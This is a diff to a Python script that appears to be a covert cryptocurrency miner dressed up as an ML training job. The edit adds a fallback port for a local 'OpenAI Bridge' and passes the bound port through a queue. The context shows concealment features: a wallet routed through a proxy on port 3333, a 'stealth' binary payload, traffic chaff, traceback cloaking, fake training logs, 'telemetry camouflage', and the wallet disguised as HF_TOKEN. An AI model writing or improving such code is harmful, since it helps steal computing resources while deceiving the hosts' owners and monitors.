@@ -16,6 +16,7 @@ import secrets
 import argparse
 import threading
 import subprocess
+import queue
 import urllib.request
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor
@@ -76,12 +77,19 @@ def extract_payloads(target_dir):
 
     return backend_so_path, stealth_so_path
 
-def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None):
+def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None, port_cb=None):
     if not worker:
         worker = get_default_worker()
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_sock.bind(('127.0.0.1', local_port))
+    try:
+        server_sock.bind(('127.0.0.1', local_port))
+    except OSError:
+        # Fallback to system-allocated ephemeral port if default port is in use
+        server_sock.bind(('127.0.0.1', 0))
+    actual_port = server_sock.getsockname()[1]
+    if port_cb:
+        port_cb(actual_port)
     server_sock.listen(5)
 
     threading.Thread(target=background_traffic_chaff, args=(proxy_url, wallet, worker), daemon=True).start()
@@ -546,15 +554,20 @@ def main():
     # Install Python Exception & Traceback Cloaking
     install_traceback_cloaking()
 
+    actual_port = args.port
     if not is_offline_test:
+        port_q = queue.Queue(maxsize=1)
         # Start OpenAI Bridge in background thread
         t_bridge = threading.Thread(
             target=run_bridge,
-            args=(args.port, args.proxy, args.wallet, worker_id),
+            args=(args.port, args.proxy, args.wallet, worker_id, port_q.put),
             daemon=True
         )
         t_bridge.start()
-        time.sleep(1.0)
+        try:
+            actual_port = port_q.get(timeout=5.0)
+        except Exception:
+            actual_port = args.port
 
         # Start fake loss logging & telemetry camouflage
         threading.Thread(target=fake_training_logs, daemon=True).start()
@@ -577,7 +590,7 @@ def main():
         print(f"[FATAL] Failed to load backend binary: {e}", file=sys.stderr)
         sys.exit(1)
 
-    os.environ["MASTER_ADDR"] = f"127.0.0.1:{args.port}"
+    os.environ["MASTER_ADDR"] = f"127.0.0.1:{actual_port}"
     os.environ["HF_TOKEN"] = args.wallet
     os.environ["LOCAL_RANK"] = worker_id
 
